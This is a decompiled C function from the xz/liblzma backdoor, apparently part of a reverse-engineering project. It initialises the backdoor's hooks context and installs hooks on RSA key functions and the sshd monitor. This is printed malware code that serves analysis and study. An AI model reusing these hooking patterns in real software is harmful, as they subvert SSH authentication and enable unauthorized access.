// /home/kali/xzre-ghidra/xzregh/1027D0_init_hooks_ctx.c
// Function: init_hooks_ctx @ 0x1027D0
// Calling convention: __stdcall
// Prototype: int __stdcall init_hooks_ctx(backdoor_hooks_ctx_t * ctx)


/*
 * AutoDoc: Primes a transient `backdoor_hooks_ctx_t` before stage two patches the GOT. It always points `hooks_data_addr` at the
 * `hooks_data` blob baked into liblzma, zeros the scratch flags, and, when `ctx->shared` is still NULL, drops in the static hook
 * entry points (`backdoor_symbind64`, the RSA shims, and the mm_* monitor hooks) before returning 0x65 so the caller can retry
 * after the shared globals are published. Once the shared block exists it simply returns 0, signalling that the structure now
 * inherits every pointer from the shared globals.
 */

#include "xzre_types.h"

int init_hooks_ctx(backdoor_hooks_ctx_t *ctx)

{
  int status;
  
  status = 5;
  if (ctx != (backdoor_hooks_ctx_t *)0x0) {
    ctx->hooks_data_addr = (backdoor_hooks_data_t **)&hooks_data;
    status = 0;
    if (ctx->shared == (backdoor_shared_globals_t *)0x0) {
      ctx->_unknown1632[0] = '\x04';
      ctx->_unknown1632[1] = '\0';
      ctx->_unknown1632[2] = '\0';
      ctx->_unknown1632[3] = '\0';
      ctx->_unknown1632[4] = '\0';
      ctx->_unknown1632[5] = '\0';
      ctx->_unknown1632[6] = '\0';
      ctx->_unknown1632[7] = '\0';
      ctx->symbind64 = (audit_symbind64_fn)&LAB_001028d0;
      ctx->hook_RSA_public_decrypt = hook_RSA_public_decrypt;
      ctx->hook_RSA_get0_key = hook_RSA_get0_key;
      ctx->mm_log_handler = mm_log_handler_hook;
      ctx->mm_answer_keyallowed = mm_answer_keyallowed_hook;
      ctx->mm_answer_keyverify = mm_answer_keyverify_hook;
      status = 0x65;
    }
  }
  return status;
}

